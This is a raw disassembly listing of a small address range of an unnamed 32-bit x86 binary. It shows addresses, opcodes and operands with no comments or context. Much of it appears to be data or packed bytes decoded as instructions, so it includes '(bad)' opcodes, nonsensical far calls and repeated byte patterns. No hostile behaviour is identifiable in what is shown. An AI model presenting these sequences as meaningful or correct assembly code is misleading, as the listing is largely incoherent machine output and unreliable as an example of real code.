  4139f9:	jae    0x413a0a
  4139fb:	or     DWORD PTR [eax+eax*4],0x7c
  4139ff:	nop
  413a00:	jge    0x413993
  413a02:	aas    
  413a03:	dec    edi
  413a04:	jbe    0x413a55
  413a06:	cmp    cl,BYTE PTR [edi+0x76]
  413a09:	dec    edi
  413a0a:	ds dec edi
  413a0c:	dec    eax
  413a0d:	dec    edi
  413a0e:	cmp    eax,0x314f7b4f
  413a13:	dec    edi
  413a14:	cmp    cl,BYTE PTR [edi+0x36]
  413a17:	dec    edi
  413a18:	push   ds
  413a19:	sbb    BYTE PTR [edi],0x83
  413a1c:	setae  BYTE PTR [eax+edx*4]
  413a20:	jl     0x4139c2
  413a22:	jge    0x4139c5
  413a24:	aas    
  413a25:	dec    edi
  413a26:	jbe    0x413a77
  413a28:	cmp    cl,BYTE PTR [edi+0x76]
  413a2b:	dec    edi
  413a2c:	ds dec edi
  413a2e:	dec    eax
  413a2f:	dec    edi
  413a30:	cmp    eax,0x314f6d4f
  413a35:	dec    edi
  413a36:	cmp    cl,BYTE PTR [edi+0x36]
  413a39:	dec    edi
  413a3a:	push   ds
  413a3b:	xchg   edx,eax
  413a3c:	pop    ds
  413a3d:	xchg   ebx,eax
  413a3e:	bt     DWORD PTR [eax+eiz*4],ecx
  413a42:	jl     0x4139f4
  413a44:	jge    0x4139f7
  413a46:	aas    
  413a47:	dec    edi
  413a48:	ins    BYTE PTR es:[edi],dx
  413a49:	dec    edi
  413a4a:	cmp    cl,BYTE PTR [edi+0x4e]
  413a4d:	dec    edi
  413a4e:	cmp    DWORD PTR [edi+0x7b],ecx
  413a51:	dec    edi
  413a52:	cmp    eax,0x304f554f
  413a57:	dec    edi
  413a58:	cmp    cl,BYTE PTR [edi+0x36]
  413a5b:	dec    edi
  413a5c:	push   ds
  413a5d:	mov    ds:0xb30fa31f,al
  413a62:	or     al,0xb0
  413a64:	jl     0x413a26
  413a66:	jge    0x413a29
  413a68:	aas    
  413a69:	dec    edi
  413a6a:	ins    BYTE PTR es:[edi],dx
  413a6b:	dec    edi
  413a6c:	cmp    cl,BYTE PTR [edi+0x4e]
  413a6f:	dec    edi
  413a70:	cmp    DWORD PTR [edi+0x7c],ecx
  413a73:	dec    edi
  413a74:	cmp    eax,0x334f5f4f
  413a79:	dec    edi
  413a7a:	cmp    cl,BYTE PTR [edi+0x31]
  413a7d:	dec    edi
  413a7e:	push   ds
  413a7f:	mov    dl,0x1f
  413a81:	mov    bl,0xf
  413a83:	ret    
  413a84:	or     al,0xc0
  413a86:	jl     0x413a58
  413a88:	jge    0x413a5b
  413a8a:	aas    
  413a8b:	dec    edi
  413a8c:	ins    BYTE PTR es:[edi],dx
  413a8d:	dec    edi
  413a8e:	cmp    cl,BYTE PTR [edi+0x4e]
  413a91:	dec    edi
  413a92:	cmp    DWORD PTR [edi+0x6a],ecx
  413a95:	dec    edi
  413a96:	cmp    eax,0x304f4e4f
  413a9b:	dec    edi
  413a9c:	cmp    cl,BYTE PTR [edi+0x34]
  413a9f:	dec    edi
  413aa0:	push   ds
  413aa1:	ret    0xc31f
  413aa4:	psrlq  mm1,QWORD PTR [eax+edx*8]
  413aa8:	jl     0x413a8a
  413aaa:	jge    0x413a8d
  413aac:	aas    
  413aad:	dec    edi
  413aae:	ins    BYTE PTR es:[edi],dx
  413aaf:	dec    edi
  413ab0:	cmp    cl,BYTE PTR [edi+0x4e]
  413ab3:	dec    edi
  413ab4:	cmp    DWORD PTR [edi+0x6b],ecx
  413ab7:	dec    edi
  413ab8:	cmp    eax,0x304f484f
  413abd:	dec    edi
  413abe:	cmp    cl,BYTE PTR [edi+0x36]
  413ac1:	dec    edi
  413ac2:	push   ds
  413ac3:	rcr    BYTE PTR [edi],cl
  413ac5:	ror    DWORD PTR [edi],cl
  413ac7:	jecxz  0x413ad5
  413ac9:	loopne 0x413b47
  413acb:	lock jge 0x413abf
  413ace:	aas    
  413acf:	dec    edi
  413ad0:	imul   ecx,DWORD PTR [edi+0x3a],0x394f5f4f
  413ad7:	dec    edi
  413ad8:	dec    edx
  413ad9:	dec    edi
  413ada:	ds dec edi
  413adc:	cmp    cl,BYTE PTR [edi+0x3f]
  413adf:	dec    edi
  413ae0:	push   ds
  413ae1:	loop   0x413b02
  413ae3:	jecxz  0x413af4
  413ae5:	repz or al,0xf0
  413ae8:	jl     0x413aea
  413aea:	jge    0x413aed
  413aec:	jl     0x413afe
  413aee:	jge    0x413b01
  413af0:	ds dec edi
  413af2:	jg     0x413b43
  413af4:	cmp    cl,BYTE PTR [edi+0x53]
  413af7:	dec    edi
  413af8:	cmp    BYTE PTR [edi+0x6a],cl
  413afb:	dec    edi
  413afc:	ds dec edi
  413afe:	dec    ecx
  413aff:	dec    edi
  413b00:	xor    ecx,DWORD PTR [edi+0x3a]
  413b03:	dec    edi
  413b04:	xor    DWORD PTR [edi+0x1e],ecx
  413b07:	add    bl,BYTE PTR [edi]
  413b09:	add    ecx,DWORD PTR [edi]
  413b0b:	adc    ecx,DWORD PTR [eax+edx*1]
  413b0e:	jl     0x413b30
  413b10:	jge    0x413b33
  413b12:	aas    
  413b13:	dec    edi
  413b14:	add    BYTE PTR [eax],al
  413b16:	sahf   
  413b17:	cmp    DWORD PTR [ecx+0x0],eax
  413b1a:	xchg   edx,eax
  413b1b:	cmp    eax,DWORD PTR [ecx+0x0]
  413b1e:	call   0x413d:0xea00413b
  413b25:	add    BYTE PTR [esi+0x3d],cl
  413b28:	inc    ecx
  413b29:	add    dl,bl
  413b2b:	cmp    eax,0x3b7a0041
  413b30:	inc    ecx
  413b31:	add    BYTE PTR [esi+0x3b],bh
  413b34:	inc    ecx
  413b35:	add    dl,dl
  413b37:	cmp    eax,0x3be20041
  413b3c:	inc    ecx
  413b3d:	add    BYTE PTR [ecx+ebp*4-0x454a0764],cl
  413b44:	pushf  
  413b45:	clc    
  413b46:	xchg   esi,eax
  413b47:	cmp    eax,DWORD PTR [ecx+0x0]
  413b4a:	or     bh,BYTE PTR ds:0x3d1e0041
  413b50:	inc    ecx
  413b51:	add    BYTE PTR [edx],ch
  413b53:	cmp    eax,0x3d3a0041
  413b58:	inc    ecx
  413b59:	add    dh,cl
  413b5b:	cmp    eax,DWORD PTR [ecx+0x0]
  413b5e:	call   0x413b:0xee004139
  413b65:	add    dh,bl
  413b67:	cmp    eax,DWORD PTR [ecx+0x0]
  413b6a:	out    dx,al
  413b6b:	cmp    eax,0x85350041
  413b70:	pushf  
  413b71:	clc    
  413b72:	cwde   
  413b73:	or     edx,DWORD PTR [edi]
  413b75:	and    DWORD PTR [edx-0x64ffbec5],0x8f81161c
  413b7f:	or     eax,0x705
  413b84:	inc    eax
  413b85:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  413b89:	fnstsw WORD PTR [ebx]
  413b8b:	ss inc ebx
  413b8d:	add    BYTE PTR [edx+0x68],dh
  413b90:	inc    ebp
  413b91:	inc    ecx
  413b92:	(bad)  
  413b93:	cli    
  413b94:	jne    0x413bf8
  413b96:	(bad)  
  413b97:	in     eax,dx
  413b98:	inc    BYTE PTR [edi]
  413b9a:	mov    esi,0x8a05a3fa
  413b9f:	cmp    eax,DWORD PTR [ecx+0x0]
  413ba2:	xor    al,0x95
  413ba4:	pushf  
  413ba5:	clc    
  413ba6:	xor    al,0x96
  413ba8:	pushf  
  413ba9:	clc    
  413baa:	cmp    edx,DWORD PTR [ebp-0x6ac50764]
  413bb0:	pushf  
  413bb1:	clc    
  413bb2:	cmp    DWORD PTR [ebp-0x6ac70764],edx
  413bb8:	pushf  
  413bb9:	clc    
  413bba:	aas    
  413bbb:	xchg   ebp,eax
  413bbc:	pushf  
  413bbd:	clc    
  413bbe:	ds xchg ebp,eax
  413bc0:	pushf  
  413bc1:	clc    
  413bc2:	cmp    eax,0x3cf89c95
  413bc7:	xchg   ebp,eax
  413bc8:	pushf  
  413bc9:	clc    
  413bca:	and    eax,0xe9f89c95
  413bcf:	stc    
  413bd0:	add    esp,DWORD PTR [eax-0x6e]
  413bd3:	cmp    DWORD PTR [ecx+0x0],eax
  413bd6:	push   ss
  413bd7:	add    DWORD PTR [ebx+0x0],eax
  413bda:	pop    ecx
  413bdb:	dec    ecx
  413bdc:	imul   si,WORD PTR ds:0x98f89c85,0xffe9
  413be4:	push   eax
  413be5:	pop    es
  413be6:	arpl   WORD PTR [edx],cx
  413be8:	add    BYTE PTR [eax],al
  413bea:	mov    ?,WORD PTR [ecx]
  413bec:	inc    ecx
  413bed:	add    BYTE PTR [edx+0xe040b],bl
	...
  413c23:	adc    BYTE PTR [eax+0x0],al
  413c26:	cmp    dl,BYTE PTR [ecx]
  413c28:	inc    ebx
  413c29:	add    BYTE PTR [eax],al
  413c2b:	add    BYTE PTR [eax],al
  413c2d:	add    BYTE PTR [eax+eax*1+0x46],al
  413c31:	add    BYTE PTR [ecx+0x0],ch
  413c34:	outs   dx,DWORD PTR ds:[esi]
  413c35:	add    BYTE PTR [edx+0x0],cl
  413c38:	dec    ecx
  413c39:	add    BYTE PTR [eax+eax*1+0x46],al
  413c3d:	add    BYTE PTR [eax+eax*1+0x49],cl
  413c41:	add    BYTE PTR [ebp+0x0],dl
  413c44:	inc    esi
  413c45:	add    BYTE PTR [edi+0x0],cl
  413c48:	imul   eax,DWORD PTR [eax],0x6f
  413c4b:	add    BYTE PTR [edx+0x0],ch
  413c4e:	dec    ebx
  413c4f:	add    BYTE PTR [eax+eax*1+0x66],cl
  413c53:	add    BYTE PTR [edx+0x0],ch
  413c56:	imul   eax,DWORD PTR [eax],0x46006f
  413c5c:	jo     0x413c5e
  413c5e:	outs   dx,DWORD PTR ds:[esi]
  413c5f:	add    BYTE PTR [ebx+0x0],ch
  413c62:	ins    DWORD PTR es:[edi],dx
  413c63:	add    BYTE PTR [eax+eax*1+0x6b],ah
  413c67:	add    BYTE PTR [ebx+0x0],dh
  413c6a:	ins    BYTE PTR es:[edi],dx
  413c6b:	add    BYTE PTR [edx+0x0],ch
  413c6e:	data16 add BYTE PTR [edi+0x0],ah
  413c72:	imul   eax,DWORD PTR [eax],0x64006f
  413c78:	add    BYTE PTR [di+0x0],dh
  413c7c:	imul   eax,DWORD PTR [eax],0x69006a
  413c82:	outs   dx,DWORD PTR ds:[esi]
  413c83:	add    BYTE PTR [esi+0x0],ah
  413c86:	add    BYTE PTR fs:[ebp+0x0],dh
  413c8a:	push   0x0
  413c8c:	add    BYTE PTR [bp+0x0],ah
  413c90:	add    BYTE PTR fs:[eax],al
  413c93:	add    BYTE PTR [eax],al
  413c95:	add    BYTE PTR [ebx+ebp*2+0x6c],al
  413c99:	fs data16 jae 0x413cfe
  413c9d:	push   0x6f
  413c9f:	imul   esp,DWORD PTR [esi+0x64],0x73
  413ca3:	imul   esp,DWORD PTR [esi+0x67],0x6a
  413ca7:	fs addr16 fs pushw 0x6867
  413cae:	addr16 pushw 0x6667
  413cb3:	push   0x6667
  413cb8:	add    BYTE PTR [eax],al
  413cba:	add    BYTE PTR [eax],al
  413cbc:	add    BYTE PTR [eax],al
  413cbe:	dec    ebx
  413cbf:	dec    edx
  413cc0:	dec    edx
  413cc1:	dec    ebx
  413cc2:	inc    esp
  413cc3:	inc    esi
  413cc4:	push   0x6b
  413cc6:	ins    BYTE PTR es:[edi],dx
  413cc7:	dec    esp
  413cc8:	cmp    al,BYTE PTR [esi+eax*2+0x49]
  413ccc:	imul   ebp,DWORD PTR [edi+0x64],0x6b66696a
  413cd3:	fs jae 0x413d45
  413cd6:	imul   esp,DWORD PTR [edi+0x66],0x6f696469
  413cdd:	push   0x69
  413cdf:	outs   dx,DWORD PTR ds:[esi]
  413ce0:	dec    edx
  413ce1:	dec    edi
  413ce2:	inc    esp
  413ce3:	inc    esi
  413ce4:	ins    BYTE PTR es:[edi],dx
  413ce5:	imul   ebp,DWORD PTR [edx+0x66],0x6f
  413ce9:	imul   esp,DWORD PTR [ebx+esi*2+0x67],0x73666a6f
  413cf1:	imul   ebp,DWORD PTR fs:[si+0x66],0x64
  413cf7:	push   0x643b6c67
  413cfc:	push   0x6667
  413d01:	add    BYTE PTR [eax],al
  413d03:	add    BYTE PTR [eax],al
  413d05:	add    BYTE PTR [ebp+0x51004100],dh
  413d0b:	dec    edi
  413d0c:	pop    edi
  413d0d:	dec    edi
  413d0e:	dec    eax
  413d0f:	dec    edi
  413d10:	push   esp
  413d11:	dec    edi
  413d12:	pop    edi
  413d13:	dec    edi
  413d14:	push   esi
  413d15:	dec    edi
  413d16:	or     DWORD PTR [edi+0x8],ecx
  413d19:	dec    edi
  413d1a:	cmp    cl,BYTE PTR [edi+0x0]
  413d1d:	add    BYTE PTR [ebp+0x4f],bl
  413d20:	pop    esi
  413d21:	dec    edi
  413d22:	push   ebx
  413d23:	dec    edi
  413d24:	or     DWORD PTR [edi+0x8],ecx
  413d27:	dec    edi
  413d28:	cmp    cl,BYTE PTR [edi+0x4f]
  413d2b:	dec    edi
  413d2c:	dec    ecx
  413d2d:	dec    edi
  413d2e:	pop    edi
  413d2f:	dec    edi
  413d30:	dec    eax
  413d31:	dec    edi
  413d32:	or     DWORD PTR [edi+0x8],ecx
  413d35:	dec    edi
  413d36:	cmp    cl,BYTE PTR [edi+0x0]
  413d39:	add    BYTE PTR [ecx+0x4f],cl
  413d3c:	push   edx
  413d3d:	dec    edi
  413d3e:	push   esi
  413d3f:	dec    edi
  413d40:	dec    ebp
  413d41:	dec    edi
  413d42:	pop    ebx
  413d43:	dec    edi
  413d44:	dec    edx
  413d45:	dec    edi
  413d46:	push   ebx
  413d47:	dec    edi
  413d48:	cmp    cl,BYTE PTR [edi+0x0]
  413d4b:	add    BYTE PTR [eax],al
  413d4d:	add    BYTE PTR [esi+0x7d],ch
  413d50:	outs   dx,BYTE PTR ds:[esi]
  413d51:	lea    ebp,[esi-0x63]
  413d54:	outs   dx,BYTE PTR ds:[esi]
  413d55:	lods   eax,DWORD PTR ds:[esi]
  413d56:	outs   dx,BYTE PTR ds:[esi]
  413d57:	mov    ebp,0xdd6ecd6e
  413d5c:	outs   dx,BYTE PTR ds:[esi]
  413d5d:	in     eax,dx
  413d5e:	outs   dx,BYTE PTR ds:[esi]
  413d5f:	std    
  413d60:	outs   dx,BYTE PTR ds:[esi]
  413d61:	or     eax,0x2d6e1d6e
  413d66:	outs   dx,BYTE PTR ds:[esi]
  413d67:	cmp    eax,0x6d6e5d6e
  413d6c:	outs   dx,BYTE PTR ds:[esi]
  413d6d:	jb     0x413ddd
  413d6f:	jae    0x413ddf
  413d71:	jo     0x413de1
  413d73:	jno    0x413de3
  413d75:	jbe    0x413de5
  413d77:	ja     0x413de7
  413d79:	je     0x413de9
  413d7b:	jne    0x413deb
  413d7d:	mov    ch,BYTE PTR [esi-0x75]
  413d80:	outs   dx,BYTE PTR ds:[esi]
  413d81:	mov    BYTE PTR [esi-0x77],ch
  413d84:	outs   dx,BYTE PTR ds:[esi]
  413d85:	mov    gs,WORD PTR [esi+0x7c]
  413d88:	pop    esi
  413d89:	jge    0x413dd9
  413d8b:	jge    0x413d4b
  413d8d:	jge    0x413deb
  413d8f:	(bad)  
  413d90:	jge    0x413e02
  413d92:	mov    ebp,0x79736eb1
  413d97:	bound  esp,QWORD PTR [edx+0x78265fc6]
  413d9d:	add    BYTE PTR [ebp+0x17],cl
  413da0:	mov    bl,0x56
  413da2:	mov    ebp,0x423742f4
  413da7:	jle    0x413d46
  413da9:	jno    0x413e0f
  413dab:	mov    cl,0x0
  413dad:	imul   ebp,DWORD PTR [eax+ecx*1+0x58fd7d0],0x40
  413db5:	xlat   BYTE PTR ds:[ebx]
  413db6:	aad    0x93
  413db8:	dec    esp
  413db9:	adc    esp,edx
  413dbb:	jge    0x413d88
  413dbd:	faddp  st(7),st
  413dbf:	leave  
  413dc0:	xchg   BYTE PTR [esi+0x1fa23214],ah
  413dc6:	pusha  
  413dc7:	icebp  
  413dc8:	push   esp
  413dc9:	(bad)  
  413dca:	aad    0x18
  413dcc:	aad    0x71
  413dce:	add    BYTE PTR [eax],al
  413dd0:	add    BYTE PTR [eax],al
  413dd2:	out    dx,eax
  413dd3:	(bad)  [ebx+0x7]
  413dd6:	jmp    0xc02f:0x4500413b
  413ddd:	and    bh,BYTE PTR [ecx+eiz*1+0x41]
  413de1:	add    BYTE PTR [esi+0x53],al
  413de4:	outs   dx,DWORD PTR ds:[esi]
  413de5:	push   ebx
  413de6:	cmp    BYTE PTR [ebx],0x41
  413de9:	add    dh,ah
  413deb:	cmp    eax,DWORD PTR [ecx+0x0]
  413dee:	(bad)  
  413def:	in     eax,dx
  413df0:	adc    al,BYTE PTR [edi]
	...
  413e12:	imul   eax,DWORD PTR [edx+0x73],0x58516165
  413e19:	pop    ecx
  413e1a:	outs   dx,BYTE PTR ds:[esi]
  413e1b:	jbe    0x413e95
  413e1d:	jns    0x413e73
  413e1f:	push   ecx
  413e20:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  413e24:	je     0x413e87
  413e26:	inc    ebx
  413e27:	jo     0x413e9b
  413e29:	data16 jp 0x413e7e
  413e2c:	jp     0x413e86
  413e2e:	ins    BYTE PTR es:[edi],dx
  413e2f:	je     0x413ea0
  413e31:	jns    0x413ea1
  413e33:	popa   
  413e34:	push   esi
  413e35:	push   ebp
  413e36:	push   0x564476
	...
  413e4b:	add    BYTE PTR [eax],al
  413e4d:	add    BYTE PTR [eax+ecx*2+0x74],dl
  413e51:	dec    esp
  413e52:	push   ebx
  413e53:	jne    0x413ec0
  413e55:	popa   
  413e56:	jp     0x413eac
  413e58:	arpl   WORD PTR [ecx+0x4b],cx
  413e5b:	push   edx
  413e5c:	imul   ebp,DWORD PTR [eax+0x53],0x4746536f
  413e63:	push   0x66495949
  413e68:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  413e6c:	push   esi
  413e6d:	jb     0x413ed7
  413e6f:	add    BYTE PTR [ebx+0x51],al
  413e72:	ins    BYTE PTR es:[edi],dx
  413e73:	pop    eax
  413e74:	ja     0x413ec3
  413e76:	je     0x413eee
  413e78:	bound  eax,QWORD PTR [ebx+eiz*2+0x0]
  413e7c:	jb     0x413ef7
  413e7e:	inc    edi
  413e7f:	push   edi
  413e80:	push   esi
  413e81:	inc    edi
  413e82:	ins    BYTE PTR es:[edi],dx
  413e83:	inc    ecx
  413e84:	inc    edi
  413e85:	jae    0x413e87
  413e87:	add    BYTE PTR [edi+0x4a],dl
  413e8a:	imul   edx,DWORD PTR [ebx+0x4b],0x78575065
  413e91:	popa   
  413e92:	push   edi
  413e93:	push   esi
  413e94:	add    BYTE PTR [eax],al
  413e96:	in     al,0xf5
  413e98:	jnp    0x413ee8
  413e9a:	jnp    0x413e6a
  413e9c:	cmc    
  413e9d:	(bad)  
  413e9e:	fcomp  DWORD PTR [esi+0x64235414]
  413ea4:	aam    0xb4
  413ea6:	in     eax,dx
  413ea7:	into   
  413ea8:	add    BYTE PTR [eax],al
  413eaa:	pop    es
  413eab:	add    DWORD PTR [eax],eax
  413ead:	add    BYTE PTR [eax+0x2206d92d],al
  413eb3:	int    0x9c
  413eb5:	pop    eax
  413eb6:	(bad)  
  413eb7:	retf   0xaf1a
  413eba:	or     bl,BYTE PTR [esi-0x348dad00]
  413ec0:	retf   0x2fbe
  413ec3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ec4:	ror    DWORD PTR [edx+0x7c],1
  413ec7:	lods   eax,DWORD PTR ds:[esi]
  413ec8:	in     al,dx
  413ec9:	outs   dx,DWORD PTR ds:[esi]
  413eca:	popa   
  413ecb:	out    dx,eax
  413ecc:	fcmovu st,st(6)
  413ece:	jb     0x413eb6
  413ed0:	sbb    eax,DWORD PTR [ebp+0x624e9cfc]
  413ed6:	sub    ebp,esp
  413ed8:	shr    DWORD PTR [eax],0x32
  413edb:	aam    0x19
  413edd:	hlt    
  413ede:	or     bl,BYTE PTR [esi]
  413ee0:	call   0x426b:0xff66703b
  413ee7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ee8:	cdq    
  413ee9:	ins    DWORD PTR es:[edi],dx
  413eea:	jb     0x413f3e
  413eec:	jg     0x413e82
  413eee:	or     BYTE PTR [esi+0x6a],dl
  413ef1:	mov    edi,0x6a71a1ce
  413ef6:	retf   0xf2a7
  413ef9:	test   eax,0x531ded61
  413efe:	xor    eax,0x940436a7
  413f03:	or     al,cl
  413f05:	lock inc ebp
  413f07:	xor    al,0x88
  413f09:	xchg   ah,al
  413f0b:	fst    DWORD PTR [eax]
  413f0d:	mov    ecx,0x89c2d390
  413f12:	ret    
  413f13:	mov    fs,WORD PTR [edi-0x50]
  413f16:	cmp    BYTE PTR ds:0x73412c36,cl
  413f1c:	or     dh,bl
  413f1e:	or     eax,0xe3543a6a
  413f23:	mov    dl,ah
  413f25:	into   
  413f26:	test   al,0xc8
  413f28:	mov    ds:0xb650a6a3,al
  413f2d:	arpl   WORD PTR ds:0x8792bd3c,dx
  413f33:	jle    0x413f88
  413f35:	jmp    0xce90:0x30558449
  413f3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f3d:	sbb    dh,bh
  413f3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f40:	popf   
  413f41:	mov    BYTE PTR [esi-0x2af096fc],al
  413f47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f48:	xor    al,bh
  413f4a:	pop    eax
  413f4b:	aad    0x6a
  413f4d:	es pushf 
  413f4f:	aas    
  413f50:	int3   
  413f51:	je     0x413fc7
  413f53:	xor    eax,0x8722b283
  413f58:	mov    esi,DWORD PTR [eax+0x3f]
  413f5b:	mov    edx,0xe8972ad8
  413f60:	and    BYTE PTR [edx-0x52],dh
  413f63:	sbb    ebx,edx
  413f65:	loopne 0x413f85
  413f67:	jle    0x413fb6
  413f69:	outs   dx,DWORD PTR ds:[esi]
  413f6a:	imul   edi,ebx,0x7d2865e2
  413f70:	out    dx,eax
  413f71:	das    
  413f72:	ficom  WORD PTR [esi+0x10b7160a]
  413f78:	cmp    DWORD PTR [edi-0x4e],edx
  413f7b:	into   
  413f7c:	add    bh,BYTE PTR [edx-0x54]
  413f7f:	stos   BYTE PTR es:[edi],al
  413f80:	xlat   BYTE PTR ds:[ebx]
  413f81:	mov    DWORD PTR [ebx],0x2ca669e2
  413f87:	cmp    al,0x99
  413f89:	cwde   
  413f8a:	repnz ror DWORD PTR [ecx+0x290c7361],0xf3
  413f92:	sub    dh,ah
  413f94:	scas   al,BYTE PTR es:[edi]
  413f95:	xchg   edx,eax
  413f96:	jle    0x413f46
  413f98:	pushf  
  413f99:	les    ecx,FWORD PTR [ecx-0x3be40568]
  413f9f:	es xchg esi,eax
  413fa1:	inc    eax
  413fa2:	cmp    bl,BYTE PTR [esi-0x257a89da]
  413fa8:	adc    dh,dl
  413faa:	mov    ecx,0x87236543
  413faf:	(bad)  
  413fb1:	aad    0x8e
  413fb3:	(bad)  
  413fb4:	out    0x0,al
	...
  414016:	pop    edx
  414017:	ficom  DWORD PTR [esi+0x60]
  41401a:	(bad)  
  41401b:	in     al,dx
  41401c:	jle    0x414018
  41401e:	mov    ch,0x80
  414020:	cmp    eax,0x2886c1f9
  414025:	xlat   BYTE PTR ds:[ebx]
  414026:	hlt    
  414027:	iret   
  414028:	add    BYTE PTR [eax],al
  41402a:	pop    es
  41402b:	add    DWORD PTR [eax],eax
  41402d:	add    BYTE PTR [ebp+ecx*1+0x116dd169],ah
  414034:	popa   
  414035:	(bad)  
  414036:	cmc    
  414037:	sub    eax,0xea6f18bf
  41403c:	hlt    
  41403d:	imul   edi,DWORD PTR [edx],0xa4e39aad
  414043:	pushf  
  414044:	cmp    eax,0x61e8619e
  414049:	ror    BYTE PTR [edi-0x5745c72b],1
  41404f:	ds xor al,0x21
  414052:	and    eax,0xa97342a3
  414057:	lds    esi,FWORD PTR [ecx+0x2]
  41405a:	(bad)  
  41405b:	cli    
  41405c:	add    al,0xbb
  41405e:	mov    dl,0xfd
  414060:	scas   eax,DWORD PTR es:[edi]
  414061:	sbb    eax,0xa27e371e
  414066:	std    
  414067:	add    ah,BYTE PTR [edi+ebx*1]
  41406a:	xor    ah,dh
  41406c:	outs   dx,DWORD PTR ds:[esi]
  41406d:	fld    DWORD PTR [ebx]
  41406f:	aam    0x9a
  414071:	pop    ecx
  414072:	neg    BYTE PTR ds:0x74479c8c
  414078:	mov    esi,0x76832e1c
  41407d:	xchg   esp,eax
  41407e:	mov    dl,BYTE PTR [eax-0x4ff2caa]
  414084:	jno    0x4140d4
  414086:	cld    
  414087:	cmp    eax,DWORD PTR [esi+0x311e4929]
  41408d:	push   ss
  41408e:	sti    
  41408f:	ds xor eax,0xb9e5b40f
  414095:	inc    edi
  414096:	jl     0x41404b
  414098:	scas   eax,DWORD PTR es:[edi]
  414099:	dec    eax
  41409a:	sbb    bh,BYTE PTR [edx]
  41409c:	mov    ds:0xaa848162,al
  4140a1:	mov    ebx,0x8121703c
  4140a6:	lock mov dh,ah
  4140a9:	in     al,0xdf
  4140ab:	mov    al,ds:0x2f14206f
  4140b0:	(bad)  
  4140b1:	sti    
  4140b2:	das    
  4140b3:	adc    ecx,eax
  4140b5:	adc    BYTE PTR [ebx-0x65db65d4],bh
  4140bb:	cmc    
  4140bc:	mov    eax,ds:0x6d618ac4
  4140c1:	out    0xd1,eax
  4140c3:	(bad)  
  4140c4:	push   0xffffff93
  4140c6:	outs   dx,DWORD PTR ds:[esi]
  4140c7:	dec    edx
  4140c8:	fisub  WORD PTR [edi]
  4140ca:	outs   dx,BYTE PTR ds:[esi]
  4140cb:	mov    esi,0x707c34ca
  4140d0:	xchg   DWORD PTR [ecx+0x5b7adccd],ebx
  4140d6:	adc    BYTE PTR [ebx],0x40
  4140d9:	jle    0x414122
  4140db:	cmp    dh,bl
  4140dd:	xor    eax,0x78573819
  4140e2:	mov    eax,0x75612921
  4140e7:	jbe    0x414109
  4140e9:	retf   0x33b
  4140ec:	push   ecx
  4140ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4140ee:	scas   al,BYTE PTR es:[edi]
  4140ef:	test   al,0xd9
  4140f1:	rol    eax,0xee
  4140f4:	in     eax,0xf1
  4140f6:	pop    esp
  4140f7:	sub    esi,DWORD PTR [edx+0x72]
  4140fa:	adc    DWORD PTR [ebx+0x28],ebp
  4140fd:	push   edi
  4140fe:	sti    
  4140ff:	mov    dl,0xbc
  414101:	mov    bh,0x5e
  414103:	add    al,0xe7
  414105:	xlat   BYTE PTR ds:[ebx]
  414106:	jecxz  0x4140f7
  414108:	pop    ecx
  414109:	pop    ebx
  41410a:	sbb    DWORD PTR [esi+0x1d6b155e],ecx
  414110:	cmp    al,0x27
  414112:	(bad)  
  414113:	push   0x2a
  414115:	xor    DWORD PTR [esp+eax*4],eax
  414118:	jb     0x41412d
  41411a:	aaa    
  41411b:	cmp    eax,DWORD PTR [ecx-0x5f]
  41411e:	jl     0x41411c
  414120:	pop    ebx
  414121:	xchg   esp,eax
  414122:	dec    ecx
  414123:	mov    fs,WORD PTR [eax-0xd]
  414126:	in     al,dx
  414127:	cdq    
  414128:	fsubr  DWORD PTR [edi+0x1f]
  41412b:	xor    BYTE PTR [edi-0x67],ch
  41412e:	test   al,0xbc
  414130:	ffree  st(0)
  414132:	mov    eax,ds:0x580
	...
  414193:	add    BYTE PTR [eax],al
  414195:	add    BYTE PTR [edx],al
  414197:	adc    al,BYTE PTR [ecx]
  414199:	mov    ds:0xb3a2b311,eax
  41419e:	push   0xffffffdd
  4141a0:	add    eax,0x8bbd55b4
  4141a5:	call   0x107:0xd0fb
  4141ac:	add    BYTE PTR [eax],al
  4141ae:	data16 (bad) 
  4141b0:	xchg   edi,eax
  4141b1:	into   
  4141b2:	mov    BYTE PTR [ecx+0x559989bb],dl
  4141b8:	iret   
  4141b9:	sbb    ecx,DWORD PTR [eax+0x51]
  4141bc:	inc    eax
  4141bd:	or     esi,DWORD PTR [ecx]
  4141bf:	sahf   
  4141c0:	adc    ah,BYTE PTR [ecx]
  4141c2:	pushf  
  4141c3:	jmp    0x41418b
  4141c5:	jae    0x414237
  4141c7:	loop   0x41416b
  4141c9:	je     0x414155
  4141cb:	inc    esi
  4141cc:	xlat   BYTE PTR ds:[ebx]
  4141cd:	push   ebp
  4141ce:	inc    esi
  4141cf:	push   cs
  4141d0:	or     DWORD PTR [ecx],ecx
  4141d2:	aas    
  4141d3:	push   ecx
  4141d4:	or     BYTE PTR ds:0xc743f4d3,al
  4141da:	push   0x7a
  4141dc:	mov    esi,0x425a5543
  4141e1:	sub    dh,al
  4141e3:	push   eax
  4141e4:	mov    al,0xa9
  4141e6:	(bad)  
  4141e7:	and    eax,0xb7e808b5
  4141ec:	lahf   
  4141ed:	jo     0x414204
  4141ef:	jmp    0x8130:0xf969064f
  4141f6:	mov    al,0xa9
  4141f8:	push   ecx
  4141f9:	push   ebp
  4141fa:	pusha  
  4141fb:	or     al,0xd3
  4141fd:	sar    DWORD PTR [ebx+0x74765f0b],1
  414203:	or     eax,0x8e9acadd
  414208:	or     BYTE PTR [ebp+0x6ceeef44],cl
  41420e:	or     ch,ah
  414210:	sub    bl,BYTE PTR [ecx+ebx*8-0xd]
  414214:	mov    ds:0x98185407,al
  414219:	jg     0x4141a4
  41421b:	jns    0x41421f
  41421d:	sbb    BYTE PTR [ebx],dh
  41421f:	inc    ebx
  414220:	push   0x49
  414222:	popa   
  414223:	jle    0x4141fe
  414225:	or     eax,0x11fd297e
  41422a:	fcomp  st(3)
  41422c:	and    bl,BYTE PTR [esi-0x46]
  41422f:	push   eax
  414230:	cmp    ah,BYTE PTR [eax+0x5d6a5374]
  414236:	repnz into 
  414238:	adc    al,0x3
